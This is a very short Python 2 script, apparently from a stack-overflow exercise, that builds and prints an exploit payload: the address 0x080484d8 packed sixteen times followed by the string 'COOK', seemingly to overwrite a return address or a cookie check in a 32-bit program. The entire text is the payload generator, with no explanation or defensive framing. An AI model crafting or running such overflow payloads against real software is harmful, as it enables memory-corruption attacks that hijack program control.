import struct

exploit = struct.pack("<L", 0x080484d8)*16 + "COOK"

print exploit
